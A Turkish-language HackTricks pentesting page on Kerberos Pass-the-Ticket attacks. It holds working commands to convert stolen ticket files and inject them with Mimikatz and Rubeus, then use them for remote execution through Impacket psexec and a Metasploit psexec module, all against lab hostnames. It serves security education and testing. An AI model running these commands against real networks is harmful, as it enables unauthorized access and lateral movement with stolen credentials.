# Pass the Ticket

{{#include ../../banners/hacktricks-training.md}}

## Genel Bakış

Pass-the-Ticket (PtT) saldırısında saldırgan, ilgili hesabın parolasına sahip olmadan biletin asıl sahibi olarak kimlik doğrulamak için çalınmış bir Kerberos bileti kullanır. Bir ticket-granting ticket (TGT), hizmet biletleri istemek için kullanılabilirken çalınmış bir hizmet bileti, hedef hizmeti ve geçerlilik süresiyle sınırlıdır.<sup>[[1]](#references)</sup>

Bilet edinme teknikleri için bkz.:

- [Windows'tan bilet toplama](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-windows.md)
- [Linux'tan bilet toplama](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md)

## Linux ve Windows Bilet Biçimlerini Dönüştürme

Kerberos önbellekleri Linux'ta genellikle MIT `ccache` dosyaları, Windows'ta ise `.kirbi` dosyaları olarak bulunur. `ticket_converter`, bir giriş bileti ve çıkış yolu kullanarak bu biçimler arasında dönüşüm yapar.<sup>[[2]](#references)</sup>

```bash
python ticket_converter.py velociraptor.ccache velociraptor.kirbi
# Expected message: Converting ccache => kirbi
python ticket_converter.py velociraptor.kirbi velociraptor.ccache
# Expected message: Converting kirbi => ccache
```

Kekeo, Windows'ta Kerberos ticket araçları da sunar.<sup>[[3]](#references)</sup>

## Ticket Kullanma

Linux'ta `KRB5CCNAME` değişkenini cache'i gösterecek şekilde ayarlayın ve Impacket client'ına parola sormadan Kerberos kullanmasını söyleyin:<sup>[[4]](#references)</sup>

```bash
export KRB5CCNAME=/root/impacket-examples/krb5cc_1120601113_ZFxZpK
python psexec.py jurassic.park/trex@labwws02.jurassic.park -k -no-pass
```

Windows'ta Mimikatz veya Rubeus, bir `.kirbi` ticket'ını mevcut logon oturumuna aktarabilir. Ortaya çıkan önbelleği incelemek için `klist` kullanın.<sup>[[5]](#references)[[6]](#references)</sup>

```powershell
mimikatz.exe "kerberos::ptt [0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi"
.\Rubeus.exe ptt /ticket:'[0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi'
klist
.\PsExec.exe -accepteula \\lab-wdc01.jurassic.park cmd
```

Ticket içe aktarma, ticket'ın temsil ettiği ve hedef hizmetin yetkilendirme politikasında belirtilenlerin ötesinde ayrıcalıklar sağlamaz. Süresi dolmuş, iptal edilmiş, bozuk veya yanlış kapsamlı ticket'lar başarısız olabilir.<sup>[[1]](#references)</sup>

Kerberos saldırılarına ilişkin daha geniş bağlam ve ilgili ticket edinme teknikleri için Tarlogic'in Kerberos saldırı rehberine bakın.<sup>[[7]](#references)</sup>

### Metasploit'te harici bir ticket'ı yeniden kullanma

Metasploit, Kerberos modülleri için Impacket'in `KRB5CCNAME` değişkenini otomatik olarak okumaz. Protokole özgü `::Krb5Ccname` seçeneği üzerinden modüle bir **ccache file** verin. `::Rhostname` değerini hedefin SPN ana bilgisayar adına, domain değerini ise hedef domain'e ayarlayın; `RHOST` hedef IP olabilir. Bu sayede hesap parolasını girmeden önceden edinilmiş bir ticket kullanılabilir.<sup>[[8]](#references)</sup>

Gerekirse önce `.kirbi` dosyasını ccache biçimine dönüştürün.<sup>[[9]](#references)</sup>

Örneğin, hedefte hizmet oluşturma izni olan bir hesap için ticket'ınız varsa bu cache'i kullanarak [SMB PsExec module](../lateral-movement/psexec-and-winexec.md) modülünü çalıştırın:<sup>[[8]](#references)[[9]](#references)[[10]](#references)</sup>

```text
use exploit/windows/smb/psexec
set RHOST 192.0.2.20
set SMBUser Administrator
set SMBDomain corp.example
set SMB::Auth kerberos
set SMB::Rhostname server.corp.example
set SMB::Krb5Ccname /path/to/administrator.ccache
set DomainControllerRhost 192.0.2.10
run
```

Metasploit önce sağlanan cache içinden eşleşen bir service ticket seçer. Yalnızca bir TGT bulursa KDC'den bir service ticket ister; dolayısıyla bu yol için de DC bağlantısı gerekir. Yalnızca service ticket içeren bir cache, ilgisiz hostlara erişim sağlamaz. Desteklenen diğer modüller için seçenek önekini değiştirin (örneğin, [WinRM](../lateral-movement/winrm.md) için `Winrm::Krb5Ccname`).<sup>[[8]](#references)</sup>



## References

- [1] [MITRE ATT&CK T1550.003 - Pass the Ticket](https://attack.mitre.org/techniques/T1550/003/)
- [2] [Zer1t0 - `ticket_converter`](https://github.com/Zer1t0/ticket_converter)
- [3] [gentilkiwi - Kekeo](https://github.com/gentilkiwi/kekeo)
- [4] [Fortra - Impacket örnekleri](https://github.com/fortra/impacket/tree/master/examples)
- [5] [gentilkiwi - Mimikatz](https://github.com/gentilkiwi/mimikatz)
- [6] [GhostPack - Rubeus](https://github.com/GhostPack/Rubeus)
- [7] [Tarlogic - Kerberos saldırı teknikleri](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [8] [Metasploit - Service kimlik doğrulaması](https://docs.metasploit.com/docs/pentesting/active-directory/kerberos/service_authentication.html)
- [9] [Metasploit - kirbi ve ccache dosyalarını dönüştürme](https://docs.metasploit.com/docs/pentesting/active-directory/kerberos/ticket_converter.html)
- [10] [Metasploit SMB client Kerberos uygulaması](https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/exploit/remote/smb/client.rb)
{{#include ../../banners/hacktricks-training.md}}
